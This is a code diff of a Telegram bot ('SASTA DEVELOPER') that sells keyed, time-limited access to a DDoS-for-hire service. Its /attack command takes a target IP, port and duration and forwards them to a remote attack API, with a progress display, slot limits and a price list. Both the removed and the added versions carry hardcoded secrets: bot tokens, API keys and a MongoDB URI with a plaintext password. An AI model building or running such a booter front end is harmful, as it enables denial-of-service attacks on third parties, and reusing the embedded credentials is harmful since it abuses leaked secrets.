@@ -1,229 +1,239 @@
-import asyncio
-import logging
+import telebot
 import requests
+import time
+import random
+import string
+import json
 import os
-import uuid
-import pymongo
-from datetime import datetime, timedelta, timezone
-from typing import Dict, Optional, List
-from functools import wraps
-from telegram import Update
-from telegram.ext import Application, CommandHandler, filters, ContextTypes
-from pymongo import MongoClient, ASCENDING
+import threading
 
 # --- CONFIGURATION ---
-ADMIN_IDS = [8787952549] 
-API_KEY = "ak_e09b114844018935feffc"
-API_URL = "https://api.battle-destroyer.shop/api/v1"
-BOT_TOKEN = "8749691844:AAH2y4OJDPmTq6LLle6fBkFYyAI9hA2FEL8"
-DATABASE_NAME = "sastadev"
-MONGODB_URI = "mongodb+srv://manasdev314_db_user:Ravirao226008@sastadev.pa9pfjb.mongodb.net/?appName=Sastadev"
+TOKEN = "8749691844:AAE36-_kLbm7H5XlPtXSTn-0liXRAQF9x-c"
+ADMIN_ID = 8787952549
+CHANNEL_ID = "-1003605767830"
+CHANNEL_LINK = "https://t.me/+jMe1PNQv_koxNzI1"
+API_URL = "http://13.203.71.127/attack"
+API_KEY_DDoS = "DESTRUCTED"
 
-# Blocked ports
-BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
+bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")
 
-# --- LOGGING ---
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
-logger = logging.getLogger(__name__)
+# Global State
+active_attacks = []
+MAX_CONCURRENT = 2
+
+def load_db(file):
+    if os.path.exists(file):
+        try:
+            with open(file, "r") as f: return json.load(f)
+        except: return {}
+    return {}
+
+def save_db(file, data):
+    with open(file, "w") as f: json.dump(data, f, indent=4)
+
+users = load_db("users.json")
+keys = load_db("keys.json")
 
 # --- UTILS ---
-def get_public_ip():
+def is_joined(user_id):
     try:
-        return requests.get('https://api.ipify.org', timeout=5).text
-    except:
-        return "Unknown"
+        status = bot.get_chat_member(CHANNEL_ID, user_id).status
+        return status in ['member', 'administrator', 'creator']
+    except: return False
 
-# --- DATABASE CLASS ---
-class Database:
-    def __init__(self):
-        print("🔄 Initializing database connection...")
-        self.client = MongoClient(MONGODB_URI)
-        self.db = self.client[DATABASE_NAME]
-        self.users = self.db.users
-        self.keys = self.db.keys
-        self.attacks = self.db.attacks
-        self._setup_indexes()
-        print("✅ Database initialized successfully!")
+def get_progress_bar(remaining, total):
+    filled = int(((total - remaining) / total) * 10)
+    bar = "▓" * filled + "░" * (10 - filled)
+    return f"[{bar}] {int(((total - remaining) / total) * 100)}%"
 
-    def _setup_indexes(self):
+def update_progress(chat_id, msg_id, target, port, duration):
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        rem = int(duration - (time.time() - start_time))
+        progress = get_progress_bar(rem, duration)
         try:
-            # Dropping existing indexes to ensure a clean start as per logs
-            self.users.drop_indexes()
-            logger.info("Dropped all existing indexes from users collection")
-            
-            self.attacks.drop_indexes()
-            logger.info("Dropped all existing indexes from attacks collection")
-            
-            # Re-creating fresh indexes
-            self.users.create_index([("user_id", ASCENDING)], unique=True)
-            logger.info("Created unique index on user_id for users collection")
-            
-            self.attacks.create_index([("user_id", ASCENDING)])
-            logger.info("Created indexes for attacks collection")
-            
-            self.keys.create_index([("key", ASCENDING)], unique=True)
-        except Exception as e:
-            logger.error(f"Error during index setup: {e}")
-
-    def get_user(self, user_id: int):
-        return self.users.find_one({"user_id": user_id})
-
-    def create_user(self, user_id: int, username: str = None):
-        if not self.get_user(user_id):
-            self.users.insert_one({
-                "user_id": user_id,
-                "username": username,
-                "approved": False,
-                "expires_at": None,
-                "created_at": datetime.now(timezone.utc)
-            })
-
-    def add_duration(self, user_id: int, days: int):
-        expiry = datetime.now(timezone.utc) + timedelta(days=days)
-        self.users.update_one(
-            {"user_id": user_id},
-            {"$set": {"approved": True, "expires_at": expiry}}
-        )
-        return expiry
-
-    def generate_key(self, days: int):
-        new_key = f"SASTA-{uuid.uuid4().hex[:8].upper()}"
-        self.keys.insert_one({"key": new_key, "days": days, "used": False})
-        return new_key
-
-    def redeem_key(self, user_id: int, key_str: str):
-        key_doc = self.keys.find_one({"key": key_str, "used": False})
-        if key_doc:
-            expiry = self.add_duration(user_id, key_doc['days'])
-            self.keys.update_one({"key": key_str}, {"$set": {"used": True, "used_by": user_id}})
-            return key_doc['days'], expiry
-        return None, None
-
-db = Database()
-
-# --- AUTH DECORATOR ---
-def admin_required(func):
-    @wraps(func)
-    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if update.effective_user.id not in ADMIN_IDS:
-            await update.message.reply_text("❌ Admin access required.")
-            return
-        return await func(update, context)
-    return wrapper
+            bot.edit_message_text(
+                f"🚀 **ATTACK IN PROGRESS** 🚀\n━━━━━━━━━━━━━━━━━━━━━━\n🎯 **TARGET:** `{target}:{port}`\n⏳ **TIME:** `{rem}s`\n📊 **PROGRESS:** `{progress}`\n━━━━━━━━━━━━━━━━━━━━━━\n💥 **POWERED BY SASTA DEVELOPER**",
+                chat_id, msg_id
+            )
+        except: break
+        time.sleep(5)
+    try:
+        bot.edit_message_text(f"✅ **ATTACK COMPLETE**\nTarget `{target}` successfully finished.", chat_id, msg_id)
+    except: pass
+    global active_attacks
+    active_attacks = [a for a in active_attacks if a['target'] != target]
 
 # --- HANDLERS ---
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    db.create_user(user_id, update.effective_user.username)
-    await update.message.reply_text(
-        "👋 Welcome to SASTA DEVELOPER Bot!\n\n"
-        "🎟️ /redeem <key> - Activate access\n"
-        "🚀 /attack <ip> <port> <time>\n"
-        "👑 /genkey <days> - Admin only"
-    )
 
-@admin_required
-async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args:
-        return await update.message.reply_text("Usage: /genkey <days>")
-    days = int(context.args[0])
-    key = db.generate_key(days)
-    await update.message.reply_text(f"🔑 **Key:** `{key}`\n⏳ **Duration:** {days} Days")
-
-async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args:
-        return await update.message.reply_text("Usage: /redeem <key>")
-    key_str = context.args[0]
-    days, expiry = db.redeem_key(update.effective_user.id, key_str)
-    if days:
-        await update.message.reply_text(f"✅ Success! Access for {days} days.")
+@bot.message_handler(commands=['start'])
+def start(message):
+    uid = str(message.from_user.id)
+    uname = f"@{message.from_user.username}" if message.from_user.username else "NoUsername"
+    
+    if uid not in users:
+        users[uid] = {"expiry": 0, "username": uname}
     else:
-        await update.message.reply_text("❌ Invalid or used key.")
+        users[uid]["username"] = uname
+    save_db("users.json", users)
 
-async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    user_data = db.get_user(user_id)
-    current_ip = get_public_ip()
-
-    if not user_data or not user_data.get("approved"):
-        return await update.message.reply_text("❌ Not approved. Redeem a key.")
+    remove_markup = telebot.types.ReplyKeyboardRemove()
     
-    expiry = user_data["expires_at"].replace(tzinfo=timezone.utc)
-    if expiry < datetime.now(timezone.utc):
-        return await update.message.reply_text("❌ Access expired.")
+    if is_joined(message.from_user.id):
+        slots = f"{len(active_attacks)}/{MAX_CONCURRENT}"
+        role = "👑 ADMIN" if int(uid) == ADMIN_ID else "⭐ VIP" if users[uid]['expiry'] > time.time() else "🆓 FREE"
+        
+        dashboard = (
+            "🚀 **SASTA DEVELOPER TERMINAL** 🚀\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"👤 **USER:** `{message.from_user.first_name}`\n"
+            f"💳 **PLAN:** `{role}`\n"
+            f"🛰️ **SLOTS:** `{slots}`\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "🛠️ **TERMINAL COMMANDS:**\n"
+            "👉 /attack - Stress Target\n"
+            "👉 /running - Live Attacks\n"
+            "👉 /redeem - Activate Key\n"
+            "👉 /myid - Your Info\n"
+            "👉 /plans - Pricing\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "👑 **OWNER:** @sastadeveloper"
+        )
+        bot.send_message(message.chat.id, dashboard, reply_markup=remove_markup)
+    else:
+        markup = telebot.types.InlineKeyboardMarkup()
+        markup.add(telebot.types.InlineKeyboardButton("📢 JOIN CHANNEL", url=CHANNEL_LINK))
+        bot.send_message(message.chat.id, "❌ **ACCESS DENIED**\nJoin channel to use terminal.", reply_markup=markup)
 
-    if len(context.args) < 3:
-        return await update.message.reply_text("Usage: /attack <ip> <port> <time>")
-
-    target, port, duration = context.args
-    
-    if int(port) in BLOCKED_PORTS:
-        return await update.message.reply_text(f"❌ Port {port} is blocked.")
-
-    payload = {"ip": target, "port": port, "duration": duration}
-    headers = {"x-api-key": API_KEY, "Content-Type": "application/json"}
+@bot.message_handler(commands=['attack'])
+def attack_cmd(message):
+    uid = str(message.from_user.id)
+    if not is_joined(message.from_user.id):
+        bot.reply_to(message, "🚨 Join channel first!")
+        return
+    if users[uid]['expiry'] < time.time() and int(uid) != ADMIN_ID:
+        bot.reply_to(message, "🚫 **VIP REQUIRED**")
+        return
+    if len(active_attacks) >= MAX_CONCURRENT:
+        bot.reply_to(message, f"⚠️ **SLOTS FULL ({len(active_attacks)}/{MAX_CONCURRENT})**")
+        return
 
     try:
-        response = requests.post(f"{API_URL}/attack", json=payload, headers=headers, timeout=15)
-        res_data = response.json()
+        args = message.text.split()
+        target, port, duration = args[1], args[2], int(args[3])
+        if duration > 300: duration = 300
+        active_attacks.append({"target": target, "end_time": time.time() + duration})
+        threading.Thread(target=lambda: requests.get(API_URL, params={"ip":target,"port":port,"time":duration,"key":API_KEY_DDoS})).start()
+        msg = bot.send_message(message.chat.id, "🛰️ **Initializing Terminal...**")
+        threading.Thread(target=update_progress, args=(message.chat.id, msg.message_id, target, port, duration)).start()
+    except:
+        bot.send_message(message.chat.id, "📝 `/attack <IP> <PORT> <TIME>`")
 
-        if res_data.get("success"):
-            attack_info = res_data.get("attack", {})
-            limits = res_data.get("limits", {})
-            account = res_data.get("account", {})
+@bot.message_handler(commands=['running'])
+def running(message):
+    global active_attacks
+    active_attacks = [a for a in active_attacks if a['end_time'] > time.time()]
+    if not active_attacks:
+        bot.reply_to(message, "✨ No active attacks.")
+        return
+    txt = f"🔥 **LIVE SLOTS: {len(active_attacks)}/{MAX_CONCURRENT}** 🔥\n\n"
+    for a in active_attacks:
+        rem = int(a['end_time'] - time.time())
+        txt += f"🚀 `TARGET: {a['target']}` | `TIME: {rem}s`\n"
+    bot.send_message(message.chat.id, txt)
+
+# --- STEALTH ADMIN COMMANDS ---
+
+@bot.message_handler(commands=['genkey'])
+def admin_gen(message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        args = message.text.split()
+        days, count = int(args[1]), int(args[2])
+        new_list = []
+        for _ in range(count):
+            k = "SD-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
+            keys[k] = {"duration": days * 86400, "used_by": None}
+            new_list.append(k)
+        save_db("keys.json", keys)
+        bot.send_message(message.chat.id, f"🎫 **KEYS GENERATED:**\n`" + "\n".join(new_list) + "`")
+    except: bot.reply_to(message, "Usage: `/genkey <days> <count>`")
+
+@bot.message_handler(commands=['keys'])
+def show_keys(message):
+    if message.from_user.id != ADMIN_ID: return
+    if not keys: bot.reply_to(message, "No keys in database."); return
+    txt = "🗝️ **MASTER KEY LIST**\n━━━━━━━━━━━━━━━\n"
+    for k, v in keys.items():
+        status = f"✅ Used by: {v['used_by']}" if v['used_by'] else "🆓 Unused"
+        txt += f"🔑 `{k}` | {status}\n"
+    bot.send_message(message.chat.id, txt)
+
+@bot.message_handler(commands=['users'])
+def show_users(message):
+    if message.from_user.id != ADMIN_ID: return
+    if not users: bot.reply_to(message, "No users found."); return
+    txt = "👥 **USER DATABASE**\n━━━━━━━━━━━━━━━\n"
+    for uid, data in users.items():
+        uname = data.get("username", "Unknown")
+        exp = data.get("expiry", 0)
+        status = "💎 VIP" if exp > time.time() else "🆓 FREE"
+        txt += f"🆔 `{uid}` | {uname} | {status}\n"
+    bot.send_message(message.chat.id, txt)
+
+@bot.message_handler(commands=['remove_key'])
+def remove_key(message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        k = message.text.split()[1]
+        if k in keys:
+            del keys[k]; save_db("keys.json", keys)
+            bot.reply_to(message, f"✅ Key `{k}` deleted.")
+        else: bot.reply_to(message, "❌ Not found.")
+    except: bot.reply_to(message, "Usage: `/remove_key <KEY>`")
+
+# --- FIXED REDEEM LOGIC ---
+@bot.message_handler(commands=['redeem'])
+def redeem(message):
+    uid = str(message.from_user.id)
+    uname = f"@{message.from_user.username}" if message.from_user.username else "NoUsername"
+    
+    # Ensure user exists in db
+    if uid not in users:
+        users[uid] = {"expiry": 0, "username": uname}
+
+    try:
+        parts = message.text.split()
+        if len(parts) < 2:
+            bot.reply_to(message, "📝 **Usage:** `/redeem <KEY>`")
+            return
             
-            # Log attack history
-            db.attacks.insert_one({
-                "user_id": user_id,
-                "target": target,
-                "port": port,
-                "duration": duration,
-                "timestamp": datetime.now(timezone.utc)
-            })
-
-            msg = (
-                f"> 𝚅𝙸𝙿 𝐒𝙴𝐑𝚅𝐄𝐑 𝐎𝙽𝐋𝚈: Attack Launched Successfully!\n\n"
-                f" Target: {target}:{port}\n"
-                f" Duration: {duration} seconds\n"
-                f" Attack ID: {attack_info.get('id', 'N/A')[:8]}...\n"
-                f" Ends At: {attack_info.get('endsAt', 'N/A')}\n\n"
-                f" Your Limits:\n"
-                f"• Active Attacks: {limits.get('currentActive', 0)} / {limits.get('maxConcurrent', 0)}\n"
-                f"• Remaining Slots: {limits.get('remainingSlots', 0)}\n\n"
-                f" Account:\n"
-                f"• Status: {account.get('status', 'active')}\n"
-                f"• Days Remaining: {account.get('daysRemaining', 0)}"
-            )
-            await update.message.reply_text(msg)
+        k = parts[1]
+        if k in keys and keys[k]['used_by'] is None:
+            # Add time to current expiry
+            current_time = time.time()
+            if users[uid]['expiry'] < current_time:
+                users[uid]['expiry'] = current_time + keys[k]['duration']
+            else:
+                users[uid]['expiry'] += keys[k]['duration']
+                
+            keys[k]['used_by'] = uname
+            save_db("users.json", users)
+            save_db("keys.json", keys)
+            bot.reply_to(message, "👑 **VIP ACCESS GRANTED!**\nYour plan has been activated/extended.")
         else:
-            error_detail = res_data.get("error", "IP not whitelisted")
-            await update.message.reply_text(f"⚠️ **Attack Failed!**\n\nError: {error_detail}\nDetails: Your IP ({current_ip}) status verification failed.")
-            
+            bot.reply_to(message, "❌ **Key Invalid or Already Used.**")
     except Exception as e:
-        await update.message.reply_text(f"❌ Connection Error: {str(e)}")
+        bot.reply_to(message, "⚠️ **System Error during redemption.**")
 
-# --- MAIN RUNNER ---
-def main():
-    application = Application.builder().token(BOT_TOKEN).build()
+@bot.message_handler(commands=['myid', 'plans'])
+def info_hub(message):
+    uid = str(message.from_user.id)
+    if 'myid' in message.text:
+        exp = users.get(uid, {}).get("expiry", 0)
+        rem = time.strftime('%Y-%m-%d %H:%M', time.localtime(exp)) if exp > time.time() else "EXPIRED"
+        bot.reply_to(message, f"👤 **ID:** `{uid}`\n📅 **EXPIRY:** `{rem}`")
+    else: bot.reply_to(message, "💎 **PLANS:** 1 Day: 100 | 7 Day: 400 | 30 Day: 2000")
 
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("genkey", genkey))
-    application.add_handler(CommandHandler("redeem", redeem))
-    application.add_handler(CommandHandler("attack", attack))
-
-    ip = get_public_ip()
-    print("---------------------------------")
-    print("🤖 Bot is starting...")
-    print(f"👑 Admin IDs: {ADMIN_IDS}")
-    print(f"🌐 API URL: {API_URL}")
-    print(f"🔑 API Key: {API_KEY[:10]}...")
-    print(f"🚫 Blocked Ports: {', '.join(map(str, sorted(BLOCKED_PORTS)))}")
-    print(f"✅ Bot is running!")
-    print(f"Server IP: {ip}")
-    print("📊 MongoDB: Connected and indexes optimized.")
-    print("---------------------------------")
-
-    application.run_polling()
-
-if __name__ == "__main__":
-    main()
+print("SASTA DEVELOPER v9.1 REDEEM FIXED...")
+bot.infinity_polling()
